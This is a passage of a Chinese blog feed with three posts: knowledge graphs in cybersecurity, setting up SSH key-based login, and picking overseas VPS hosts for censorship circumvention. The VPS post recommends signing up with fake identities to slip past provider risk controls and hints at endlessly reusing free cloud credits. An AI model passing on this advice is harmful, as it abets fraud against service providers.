        <content type="html"><![CDATA[<h1 id="知识图谱及其在安全领域的应用"><a href="#知识图谱及其在安全领域的应用" class="headerlink" title="知识图谱及其在安全领域的应用"></a>知识图谱及其在安全领域的应用</h1><h2 id="1-知识图谱是什么？"><a href="#1-知识图谱是什么？" class="headerlink" title="1. 知识图谱是什么？"></a>1. 知识图谱是什么？</h2><h3 id="1-1-知识（Knowledge）是什么？"><a href="#1-1-知识（Knowledge）是什么？" class="headerlink" title="1.1 知识（Knowledge）是什么？"></a>1.1 知识（Knowledge）是什么？</h3><p>知识图谱（Knowledge Graph）正如其名，其本质是为了<strong>表示知识</strong>[1]。那么知识是该如何定义呢？我们来看一下维基百科中的定义：</p><blockquote><p>  知识是对某个主题确信的认识，并且这些认识拥有潜在的能力为特定目的而使用。意指透过经验或联想，而能够熟悉进而了解某件事情；这种事实或状态就称为知识，其包括认识或了解某种科学、艺术或技巧。此外，亦指透过研究、调查、观察或经验而获得的一整套知识或一系列资讯。</p></blockquote><p>可以从这块相对抽象的定义里得到一个主观的感受，那就是知识是一种认知，其既是一种事实，也是一种状态。比如，“我会加减乘除”是一种事实也是在表述我通过学习和实践，使得现在已经掌握这项技能的一种状态。并且这种认知是相对复杂的，有从时间变化的纵向维度，也有涉及到关系、概念、实践等等横向维度的变化。但不变的是，知识是有一个主题的，以及由主题衍生出来的各个“属性”组成，类似于树状结构，这一棵树，就是一条知识。</p><p>如果用官方一点的定义呢，每条知识是表示为一个SPO三元组，即Subject（主体）——Predicate（谓语）——&gt;Object（客体）[1]。</p><p>那个回到“表示知识”这个关键点，我们创造出知识图谱这个概念，就是为了帮助我们更快、更好地用来表示出多条独立的“知识”。更进一步说，知识图谱就是用来组织和描述SPO三元组的。</p><p>那么如何描述呢？请看下一部分</p><h3 id="1-2-如何描述三元组？"><a href="#1-2-如何描述三元组？" class="headerlink" title="1.2 如何描述三元组？"></a>1.2 如何描述三元组？</h3><p>前面我们介绍了知识的概念和SPO三元组，我们已经知道了，知识图谱是一条条知识组成的，一条条知识又是三元关系（Subject——Predicate——&gt;Object）组成的，那么问题就来了，如何描述这个三元关系呢？</p><h4 id="使用RDF来表示"><a href="#使用RDF来表示" class="headerlink" title="使用RDF来表示"></a>使用RDF来表示</h4><p>在知识图谱中，我们用RDF形式化地表示这种三元关系。[1] 从定义上来看，RDF(Resource Description Framework)，即资源描述框架，是W3C制定的，用于描述实体/资源的标准数据模型。[1] 为什么我们描述知识要用“Web”的形式去描述呢？因为网络、Web中的各项关系，其实和知识的抽象概念很像，这是一种即像树，又像网的东西。</p><p>有唯一确定主体、有连接属性的谓语、有明确属性值。</p><p>那么RDF框架下，对三元组是如何具体定义的呢？我们先来了解一下RDF图中定义的三种类型：International Resource Identifiers(IRIs)，blank nodes 和 literals[1]。RDF通过定义出来的这三种属性对SPO三元组进行约束：</p><blockquote><ol><li>Subject可以是IRI或blank node。</li><li>Predicate是IRI。</li><li>Object三种类型都可以。</li></ol></blockquote><p>可以看到，主体必须是能唯一表示的，或者干脆就是匿名资源（Blank Node，这个概念可以向外引申，在这里可以先忽略）。唯一表示就会用到IRI，相当于是URL和URI的推广[1]，用于唯一定义一个实体或是资源。（说白了，就是我们要通过一个确定的方式来找到唯一的它）</p><p>谓语也是要唯一表示的，就像你都不知道要和另一个人建立什么关系，你又怎么能跑过去说我们在一起吧。这个“在一起的两个人“这个关系描述得就太模糊，不能唯一确定。举个例子，两个男的可以是朋友、可以是仇人也可以是情侣。</p><p>那我们整理一下RDF定义三种类型的用处：</p><ul><li>IRI —— 在整个网络或者图中唯一定义了一个实体/资源</li><li>blank node —— 没有IRI和literal的资源，或者说匿名资源[1]，暂不详细分析</li><li>literal —— 字面量，可以看作是带有数据类型的纯文本</li></ul><p>回到刚刚那个例子，架设有两个男人一个为A，一个为B，我们的主体Subject是男人A，我们给他一个IRI：<code>www.man-a/relation</code>；我们的谓语是表示与主体是朋友的关系，我们给他一个带有prefix的IRI：<code>kg:firiends</code>；然后我们的客体就是男人B的名字，我们给他一个字面量：<code>man-b</code>。</p><p>那么这个描述两个男人间朋友关系的这个知识就可以表述为：<code>www.man-a/relation</code> ——<code>kg:firiends</code>——<code>man-b</code>。</p><p>是不是一下子就很清楚了。这就是RDF的作用，使用标准数据模型的方式来进行资源描述。</p><h4 id="使用属性图来表示"><a href="#使用属性图来表示" class="headerlink" title="使用属性图来表示"></a>使用属性图来表示</h4><p>介绍完RDF来表示关系，是不是感觉略有一点复杂，确实，这种方式比较严谨，更贴近知识图谱原始的定义。但实际在工业界应用过程中，还是会有相当多的场景会选择用<strong>属性图（Property Graph）</strong>的形式来描述“关系”。那么下面我们来介绍一下属性图的方式。</p><p>属性图(Property Graph)的逻辑其实特别好理解，就是主体会和很多客体有关系，比如主体是一个普通人A的话，他会有手机号、会有性别、会有家人，这些就是他的客体。而他和他的手机号之间，就是“拥有”的关系、他和他的父亲，就是父子关系，这种关系就是主体和客体的关系。以上三种，主体、关系、客体，都可以有相应的属性。例如普通人A，属性可以是他的名字（也可以成为一种主客体关系）；他和他的手机号之间是拥有的关系，“拥有”关系可以有属性“何时拥有”、”如何拥有“等；手机号也可以有属性，比如归属的运营商名字等等。</p><p>这种同样描述主客体关系，但<strong>支持实体或关系拥有属性的方式</strong>，就称为属性图表示。</p><h3 id="1-3-从知识到知识图谱"><a href="#1-3-从知识到知识图谱" class="headerlink" title="1.3 从知识到知识图谱"></a>1.3 从知识到知识图谱</h3><p>我们从知识的定义讲到了如何表示使用RDF定义单条知识，那么知识图谱的具体形象就呼之欲出了，知识图谱就是有多条知识组成的树状或网状结构，总体来说是图的结构。</p><p>主体必须唯一确定，谓语需要清楚描述，客体可以是另一条“子知识“也可以是字面量（也就是带数据类型的纯文本）。</p><p>以下是一个使用RDF描述的知识图谱，可以看到其通过RDF标准来表示出了单条的知识以及总体的关系：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926101327.png"></p><p>图：罗纳尔多知识图谱[1]</p><p>以下是一个由属性图来表示的知识图谱，注意其支持实体或关系拥有属性，而RDF形式的就不支持：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926135943.png"></p><p>图：一个简单的属性图[2]</p><p>其实更严谨地说，这两种不同的描述关系的方式，其实也是代表了两种知识图谱的存储方式：</p><ul><li>基于RDF存储的形式</li><li>基于图数据库的存储</li></ul><p>以下是两者之间的比较：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926140846.png"></p><p>图：RDF和图数据库方式的比较[2]</p><h3 id="1-4-知识图谱的作用"><a href="#1-4-知识图谱的作用" class="headerlink" title="1.4 知识图谱的作用"></a>1.4 知识图谱的作用</h3><blockquote><p>  知识图谱提供了从“关系”的角度去分析问题的能力。 知识图谱这个概念最早由Google提出，主要是用来优化现有的搜索引擎。 不同于基于关键词搜索的传统搜索引擎，知识图谱可用来更好地查询复杂的关联信息，从语义层面理解用户意图，改进搜索质量。[2]</p></blockquote><p>从这个概念上来说，知识图谱主要解决的问题是一个<strong>复杂关联信息</strong>的查询和表示。那么我们来看看它的应用需求应该是如何的，换句话说，就是什么样的情况下，我们可以考虑采用知识图谱：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926142834.png"></p><p>图：对采用知识图谱的需求分析</p><h2 id="2-在安全领域的应用"><a href="#2-在安全领域的应用" class="headerlink" title="2. 在安全领域的应用"></a>2. 在安全领域的应用</h2><h3 id="2-1-安全知识图谱"><a href="#2-1-安全知识图谱" class="headerlink" title="2.1 安全知识图谱"></a>2.1 安全知识图谱</h3><blockquote><p>  安全知识图谱（Cyber Security Knowledge Graph）是知识图谱在<a href="https://cloud.tencent.com/product/ns?from=10680" target="_blank" rel="noopener">网络安全</a>领域的实际应用，包括基于本体论构建的安全知识本体架构，以及通过威胁建模等方式对多源异构的网络安全领域信息（ Heterogeneous Cyber Security Information）进行加工、处理、整合，转化成为的结构化的智慧安全领域知识库。[3]</p></blockquote><p>上面说到了知识图谱的作用，我们再回顾一下，知识图谱可以解决复杂关系信息的查询和表示。因此，在安全领域，我们在进行应用的时候，同样要考虑以下几点：</p><ul><li><p>是否有强烈可视化需求？</p></li><li><p>是否有较高的语义分析需求？</p></li><li><p>是否本事拥有海量的多源异构数据，且存在一定的信息孤岛问题？</p></li><li><p>是否有对关系进行深入搜索、挖掘、分析的需求？</p></li><li><p>是否有资源和能力去搭建系统，并且能进行运营？</p></li></ul><p>其实思考这几个问题的时候，我们的需求和对应的应用场景，有经验的同学应该就比较清晰了。知识图谱需要解决的问题，它的应用，主要是：</p><ul><li>从海量数据中挖掘、表示威胁的实体相关信息</li><li>提高威胁分析的效率，从关系出发去挖掘事件（Incident）、表示事件</li><li>对于基于语义分析的威胁发现具有相对的优势</li></ul><p>因此，我们也可以用一句话来说明安全知识图谱的作用：从威胁实体和实体关系的视角出发，主要针对多源异构数据，利用语义分析的特点，识别威胁以及对威胁进行评估。</p><p>以下是一个用安全知识图谱表示的永恒之蓝攻击防御场景：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926145332.png"></p><p>图：利用知识图谱构建攻击场景[4]</p><h3 id="2-2-从需求到应用"><a href="#2-2-从需求到应用" class="headerlink" title="2.2 从需求到应用"></a>2.2 从需求到应用</h3><h4 id="2-2-1-分析需求"><a href="#2-2-1-分析需求" class="headerlink" title="2.2.1 分析需求"></a>2.2.1 分析需求</h4><h5 id="偏向于事件分析"><a href="#偏向于事件分析" class="headerlink" title="偏向于事件分析"></a>偏向于事件分析</h5><p>知识图谱的关键点在于对“关系”的描述。对于事件来说，我们需要一个更高纬度的知识表达，主要来说，可以主要从这几个方面出发：威胁主体、攻击方法、资产、隐患和防御手段[4]。</p><p>使用基于属性图的知识图谱构建，我们需要定义好主客体的关系以及三者各自的属性；使用基于RDF的知识图谱构建，我们需要更加关注于严格的推理关系、将属性的表达用确定的关系谓语代替。</p><h5 id="偏向于情报分析"><a href="#偏向于情报分析" class="headerlink" title="偏向于情报分析"></a>偏向于情报分析</h5><p>对于情报分析来说，我们很多时候不是要关注自己怎么样，而是要关注对手怎么样，所以知识图谱在安全情报分析中的应用，主要的关注于：</p><ul><li>对手是谁（Who）：包括威胁行为体，赞助商和雇主</li><li>对手使用什么（What）：包括他们的能力和基础设施</li><li>对手的行动时（When）：确定行动的时间表和规律</li><li>对手的目的（Why）：包括他们的动机和意图</li><li>对手的目标行业和地理区域（Where）：详细说明行业，垂直行业和地理区域</li><li>对手如何运作（How）：关注于他们的行为和规律</li></ul><p>以上的5W1H[5]可以作为安全情报知识图谱构建时的参考，例如使用基于属性图的知识图谱构建，我们可以这样去构建：</p><ul><li>威胁行为体作为Subject，赞助商和雇主可以作为其属性（Property）</li><li>基础设施作为威胁行为体的Object，用“自身拥有”或是”非法占用“来描述他们的关系（Predicate）</li><li>…</li></ul><h5 id="偏向于特定威胁分析"><a href="#偏向于特定威胁分析" class="headerlink" title="偏向于特定威胁分析"></a>偏向于特定威胁分析</h5><p>在这边我对它的定义主要用于分析某种特定恶意行为。这种特定的恶意行为需要有较明确，且相对唯一的攻击链。例如，我们可以把对恶意钓鱼邮件的攻击视为一种特定威胁，我们对恶意钓鱼邮件的分析，从规则、模型到专家经验转换等等，都是在对其进行特定威胁的分析。</p><p>从另一方面来说，一种特定的技战术组合也可以称为一种特定威胁，因为它的杀伤链也相对固定，对于这部分的知识图谱构建，可以帮助我们从整体角度观察威胁。</p><h4 id="2-2-2-展示需求"><a href="#2-2-2-展示需求" class="headerlink" title="2.2.2 展示需求"></a>2.2.2 展示需求</h4><p>也许部分同学一看到展示需求，心里就会冒出来“大屏”、“给领导看的”、“没啥用”这些想法，虽然这确实也是一种现象，但我们也应该好好考虑一下这部分。</p><p>因为做安全的最终目的，还是说为了提高总体的安全能力，这个安全能力小到个人水平，大到国家安全。我们实际点讲，怎么才能提高企业的安全呢？企业安全由于其复杂性，不是某一方向上的技术很酷就能起到提高整日安全能力的。</p><p>企业安全的关键还是在于从检测——分析——响应——优化的闭环。这个闭环是关键，而这个闭环中，所要参与到的各个部门、乃至同部门的各个方向、同个方向上的各个人员，他们的先验知识都是不一样的。我们使用知识图谱进行展示的本意，是为了<strong>结构化地表达知识</strong>。从而降低闭环中各个环节的成本。这个成本包含很多方面，有时连沟通成本也是。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>本文主要是学习和整理了知识图谱的相关概念，以及对其在安全领域的应用做了一个简单的分析。这块仍是处于一个探索阶段，还是有许多新的思路和落地方案需要补充。欢迎各位师傅批评指正！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 为什么需要知识图谱？什么是知识图谱？——KG的前世今生, <a href="https://www.zhihu.com/people/simmerchan" target="_blank" rel="noopener">SimmerChan</a>, <a href="https://zhuanlan.zhihu.com/p/31726910" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31726910</a></p><p>[2] 这是一份通俗易懂的知识图谱技术与应用指南, <a href="https://www.jiqizhixin.com/articles/2018-06-20-4" target="_blank" rel="noopener">https://www.jiqizhixin.com/articles/2018-06-20-4</a></p><p>[3] 安全知识图谱助力内部威胁识别, <a href="https://cloud.tencent.com/developer/user/6803452" target="_blank" rel="noopener">绿盟科技研究通讯</a>, <a href="https://cloud.tencent.com/developer/article/1556641" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1556641</a></p><p>[4] 【RSA2018】创新沙盒 | AWAKE SECURITY基于机器学习的安全分析平台, <a href="http://blog.nsfocus.net/author/liuweixin/" target="_blank" rel="noopener">刘威歆</a>, <a href="http://blog.nsfocus.net/rsa2018-awake-security/" target="_blank" rel="noopener">http://blog.nsfocus.net/rsa2018-awake-security/</a></p><p>[5] 从现状看威胁情报发展趋势，e1knot，<a href="https://zhuanlan.zhihu.com/p/183993203" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/183993203</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH免密登陆</title>
      <link href="/2020/09/25/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%85%A5%E5%B0%8F%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/09/25/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%85%A5%E5%B0%8F%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH免密登陆"><a href="#SSH免密登陆" class="headerlink" title="SSH免密登陆"></a>SSH免密登陆</h1><p>在面试的时候，有个面试官问过一个问题：如果你是一个安全运维人员，你会做什么来提升SSH安全性？</p><p>当时有提到说要使用publickey的形式登入，而不要使用密码登入的形式。但前者其实自己不是很熟练，因此在这里记一下使用publickey免密登入的过程。</p><h2 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1. 流程图"></a>1. 流程图</h2><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200926081536.png"></p><p>图：SSH公钥匙登入过程</p><p><del>先偷个懒，画了个流程图，文字部分以后再补😏</del></p><h2 id="2-具体命令"><a href="#2-具体命令" class="headerlink" title="2. 具体命令"></a>2. 具体命令</h2><h3 id="本地生成一对密钥"><a href="#本地生成一对密钥" class="headerlink" title="本地生成一对密钥"></a>本地生成一对密钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -o</span><br></pre></td></tr></table></figure><p>接着输入所生成密钥对的位置，小心不要覆盖；然后需要选择输入密钥的口令（passphrase），可以留空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/Users/xxxxx/.ssh/id_rsa): /Users/xxxxx/.ssh/id_rsa_for_test</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure><p>此时，我们已经在指定位置生成一对密钥了，例如上面就是在<code>/Users/xxxxx/.ssh/id_rsa</code>。</p><h3 id="在服务端开启公钥登入"><a href="#在服务端开启公钥登入" class="headerlink" title="在服务端开启公钥登入"></a>在服务端开启公钥登入</h3><p>登入服务器，对文件<code>/etc/ssh/sshd_config</code>进行编辑，开启远程公钥登入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>加入或者将以下的配置行解除注释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2</span><br></pre></td></tr></table></figure><p>保存修改后，重启ssh服务，例如Debian系统使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service sshd restart</span><br></pre></td></tr></table></figure><h3 id="本地公钥发送"><a href="#本地公钥发送" class="headerlink" title="本地公钥发送"></a>本地公钥发送</h3><p>对于上面的流程图中第三步，我们需要本地生成的密钥对中的公钥发送到服务器，我们使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id -i id_rsa.pub root@xxx.xxx.xx.xxx</span><br></pre></td></tr></table></figure><p>如上面的命令，我们用<code>ssh-copy-id</code>命令，用<code>-i</code>参数指定发送的公钥，后面则是需要传送的服务器用户名、IP地址。输入密码验证后，我们看到响应信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Number of key(s) added:        1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   <span class="string">"ssh 'root@xxx.xxx.xx.xxx'"</span></span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br></pre></td></tr></table></figure><p>显示公钥发送成功，接下来就可以尝试免密（公钥）登入。</p><h3 id="尝试登入"><a href="#尝试登入" class="headerlink" title="尝试登入"></a>尝试登入</h3><p>直接ssh尝试登入，输入密钥的口令（如果在本地生成是设置了的话需要，留空则不需要）即可登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  ssh root@xxx.xxx.xx.xxx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于海外云服务器的选择</title>
      <link href="/2020/09/19/%E5%A4%96%E7%BD%91%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%AF%94%E8%BE%83/"/>
      <url>/2020/09/19/%E5%A4%96%E7%BD%91%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<h1 id="关于海外云服务器的选择"><a href="#关于海外云服务器的选择" class="headerlink" title="关于海外云服务器的选择"></a>关于海外云服务器的选择</h1><p>以下是个人的一些经验，仅作参考，有很多不准的地方。</p><p>只做技术分析和探讨，不含任何教唆意思。</p><blockquote><p>  <strong>人是生而自由，却无往不在枷锁之中。自以为是其他一切的主人的人，反而比其他一切更是奴隶。</strong> —— 卢梭</p></blockquote><h2 id="1-根据不同的目的"><a href="#1-根据不同的目的" class="headerlink" title="1. 根据不同的目的"></a>1. 根据不同的目的</h2><p>以下是根据主要的目的进行分类，并且在推荐时是略忽略其他的用途的，如果你的需求是All In One，那么请看后面内容。</p><h3 id="以科学上网为目的"><a href="#以科学上网为目的" class="headerlink" title="以科学上网为目的"></a>以科学上网为目的</h3><p>科学上网主要是追求线路的稳定和高速，并且也要考虑到月流量的限制。我们分析一下需求：</p><ul><li>主要考虑因素：<ul><li>线路稳定，在特殊时期最好也不崩</li><li>高速，延迟低</li><li>流量相对宽松（但也因人而已，如果只是浏览网页、查查资料，那这边的需求就相对很小）</li></ul></li><li>次要考虑因素<ul><li>服务器配置（只用来科学上网，配置很低也没有关系）</li></ul></li></ul><p>因此，我们得到一个结论，我们需要一台线路优质，流量宽松的云服务器，其配置方面的性价比可以忽略的云服务器。</p><p>那么其中最重要的线路是该怎么看呢？我们补充一下线路的知识，查看“补充”部分。</p><p>具体来说，对于云服务商的选择，常用的几家分别为：</p><ul><li><p><a href="https://www.hostdare.com/" target="_blank" rel="noopener">HostDare</a></p><ul><li>物美价廉，CN2 GIA线路亲测长时间稳定，且速度也挺不错的，流量是每月600 GB，也是挺不错了</li></ul></li><li><p><a href="https://bandwagonhost.com/" target="_blank" rel="noopener">Bandwagon</a></p><ul><li>俗称搬瓦工，国人很喜欢，确实比较稳定高速，但是吧，个人觉得CN2 GIA线路的性价比不如HostDare（可能是赚钱了膨胀了吧），而且用的人多，也是个隐患</li></ul></li><li><p><a href="https://hosteons.com/" target="_blank" rel="noopener">HostEONS</a></p><ul><li>便宜，很适合当科学上网的备用服务器，线路质量一般，但每月流量好像是无限的?</li></ul></li></ul><h3 id="啥都整一整的"><a href="#啥都整一整的" class="headerlink" title="啥都整一整的"></a>啥都整一整的</h3><p>这种不是以科学上网为主要目的的，用来折腾的，推荐用一些大平台的，大平台的管理相对方便，并且出了问题的解决方案也比较多。</p><p>常用的有：</p><ul><li><a href="https://cloud.google.com/" target="_blank" rel="noopener">Google Cloud</a><ul><li>确实好用，并且注册送的100道优惠券也是真香，相对其他几家风控做得不是很严格，所以理论上也是可以“无限白嫖”的，具体方法就不说了，不太好。</li><li>性价比确实可以的，当作测试机用的话，非特殊时期的稳定性也是完全OK</li><li>个人喜欢韩国线路，感觉速度和稳定性还有使用人数之间，算是比较平衡吧</li></ul></li><li><a href="https://vultr.com/" target="_blank" rel="noopener">Vultr</a><ul><li>在不考虑GFW的情况下，性价比和平台的优化程度非常高，确实很好用</li><li>因为这边考虑主要是推荐给喜欢折腾的同学，那么就默认说这部分同学已经架设好稳定高速地科学上网了，在这个前提下，还是挺推荐使用Vultr的</li></ul></li></ul><h2 id="2-All-In-One"><a href="#2-All-In-One" class="headerlink" title="2. All In One"></a>2. All In One</h2><p>砸钱，买大平台的CN2 GIA高配主机。虽然听起来是废话，但确实如此嘛，市场毕竟是市场。</p><p>然后，还是根据自己经验给两个建议：</p><ul><li>用虚拟身份可以，虚拟的姓名、手机号、地址等等，都可以弄，但你要对自己隐藏身份的能力有足够信心。不然被平台的风控策略抓到了，给你发了整改工单，还由于使用了小号邮箱没有去检查的话，是很有可能会封号或者暂停服务的。（别问我怎么知道～躺平）</li><li>为什么说选择大平台呢，因为小的云服务商都是用类似的Panel进行管理，这种可靠程度实在有限，而且你都砸了很多钱想All In One了，就还是选大平台吧。在某些情况下，也许被GFW处理的可能性更大，但是解决方案也比小平台多更多。</li></ul><h2 id="3-关于线路的选择"><a href="#3-关于线路的选择" class="headerlink" title="3. 关于线路的选择"></a>3. 关于线路的选择</h2><p>如果手头宽裕，而且希望稳定高速，那么选CN2 GIA<strong>商用</strong>线路是最好的。但就像前面在不同目的下进行介绍一样，如果你只是想用CN2 GIA的线路，但不想用这个主机做很多事情，那么完全可以选择低配置，好线路的平台，比如HostDare就有几款（我真的没有打广告啊～～）。</p><p>如果对科学上网不是刚需，或者弹性空间大的同学，说实话，用谷歌云足够了。再说具体点，如果你的需求只是看看Instagram，看看奈飞，偶尔用用谷歌，<del>然后听听梅梅最新的专辑</del>。这种就乖乖地上机场吧。自己搭建的经济成本，耗费的精力，在我看都不太值得。</p><h2 id="4-关于地区的选择"><a href="#4-关于地区的选择" class="headerlink" title="4. 关于地区的选择"></a>4. 关于地区的选择</h2><p>这个问题比价复杂，涉及到不同线路、出口和路由的问题，以及GFW在不同时期的策略等等。后续补充。</p><p>对于大部分情况，选线路比选地方更重要。</p><h2 id="5-补充"><a href="#5-补充" class="headerlink" title="5. 补充"></a>5. 补充</h2><h3 id="线路的基本知识"><a href="#线路的基本知识" class="headerlink" title="线路的基本知识"></a>线路的基本知识</h3><h4 id="线路是什么？"><a href="#线路是什么？" class="headerlink" title="线路是什么？"></a>线路是什么？</h4><p>这里所指的线路，是指对于云服务器来说，我们进行访问、通讯的时候， 是走什么<strong>网络线路</strong>出去的。</p><h4 id="线路有哪些？"><a href="#线路有哪些？" class="headerlink" title="线路有哪些？"></a>线路有哪些？</h4><ul><li>163<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E4%BA%92%E8%81%94%E7%BD%91%E9%AA%A8%E5%B9%B2%E7%BD%91" target="_blank" rel="noopener">骨干网</a>，骨干网是指“能够覆盖全国、连接不同区域并且可以通过互联互通节点与其他网络进行连接的大型网络”[1]，而常说的163是指其特服号，从上世纪开始建设，并且承担了绝大部分的电信业务负载</li><li>CN2(Chinatelecom Next Carrier Network，CNCN/CN2, 中国电信下一代承载网)<ul><li>CN2 GT(Global Transit)</li><li>CN2 GIA(Global Internet Access)</li></ul></li></ul><p>线路的区别主要是一个优先级的问题。由于QoS(Quality of Service，服务质量)机制的存在，会对不同优先级用户的数据流采用不同的优先等级。通常来说，政府用户/企业用户/CN2线路的优先级更高，而使用家庭</p><h4 id="怎么判断线路"><a href="#怎么判断线路" class="headerlink" title="怎么判断线路"></a>怎么判断线路</h4><p>看线路的区别，主要是通过追踪路由的方式，判断去程路由和回程路由的节点情况。</p><p>使用<code>traceroute</code>追踪路由（e.g. <code>$ traceroute xxx.xxx.xx.x</code>），可以通过以下几点来判断：</p><ul><li>如果全程<strong>没有出现过</strong><code>59.43</code>开头的节点，或者出现了很多<code>202.97</code>开头的IP，那么一般来说就是普通的163骨干网线路</li><li>如果出现了<code>59.43</code>开头的IP，或者有明显的CN2相关域名信息（例如<code>cn2-gia.ceranetworks.co</code>）出现，那么一般是CN2线路，里面</li><li>日韩的IP如果追踪时不能发现明显的域名信息，并且也没有<code>59.43</code>或者<code>202.97</code>开头的IP，那么有可能是<a href="https://www.idcspy.com/ntt.html" target="_blank" rel="noopener">NTT线路</a></li></ul><h4 id="线路的比较"><a href="#线路的比较" class="headerlink" title="线路的比较"></a>线路的比较</h4><p>以下是对三种主要线路的总结比较，偷懒一下，直接摘抄一下这位师傅的总结：[2]</p><blockquote><p>  <strong>普通163:</strong> 就是电信用户最经常遇到的电信线路，等级最低，省级/出国/国际骨干节点都以202.97开头，全程没有59.43开头的CN2节点。在出国线路上表现为拥堵，丢包率高。</p><p>  <strong>CN2 GT:</strong> CN2里属于Global Transit的产品(又名GIS-Global Internet Service)，在CN2里等级低，省级/出国节点为202.97开头，国际骨干节点有2～4个59.43开头的CN2节点。在出国线路上拥堵程度一般，相对于163骨干网的稍强，相比CN2 GIA，性价比也较高。</p><p>  <strong>CN2 GIA:</strong> CN2里属于Global Internet Access的产品，等级最高，省级/出国/国际骨干节点都以59.43开头，全程没有202.97开头的节点。在出国线路上表现最好，很少拥堵，理论上速度最快最稳定，当然，价格也相对CN2 GT偏高。</p></blockquote><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 中国互联网骨干网, 维基百科, <a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E4%BA%92%E8%81%94%E7%BD%91%E9%AA%A8%E5%B9%B2%E7%BD%91" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E4%BA%92%E8%81%94%E7%BD%91%E9%AA%A8%E5%B9%B2%E7%BD%91</a></p><p>[2] 什么是CN2线路？，<a href="https://home.cnblogs.com/u/kaishirenshi/" target="_blank" rel="noopener">开始认识</a>，<a href="https://www.cnblogs.com/kaishirenshi/p/11757736.html" target="_blank" rel="noopener">https://www.cnblogs.com/kaishirenshi/p/11757736.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 跨过山河大海 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于工程化和基础理论研究的思考</title>
      <link href="/2020/09/14/%E5%85%B3%E4%BA%8E%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%92%8C%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA%E7%A0%94%E7%A9%B6%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/09/14/%E5%85%B3%E4%BA%8E%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%92%8C%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA%E7%A0%94%E7%A9%B6%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
